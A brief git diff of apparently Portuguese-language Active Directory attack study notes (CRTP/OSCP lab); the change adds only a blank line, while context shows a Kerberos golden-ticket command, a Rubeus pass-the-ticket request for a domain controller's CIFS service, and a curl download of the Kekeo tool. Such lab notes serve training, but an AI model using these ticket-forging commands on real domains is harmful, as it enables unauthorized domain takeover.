@@ -3094,6 +3094,7 @@ Kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-321
 .\Rubeus.exe asktgs /ticket:C:\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
 ```
 ou
+	
 5. KEKEO OLD - SOLICITAR O TGS PARA SERVIÇO DO DOMAIN CONTROLLER (CIFS NO DOMAIN CONTROLLER)
 ```
 curl http://172.16.99.209/oscp/crtp/kekeo_old.zip -Outfile kekeo_old.zip
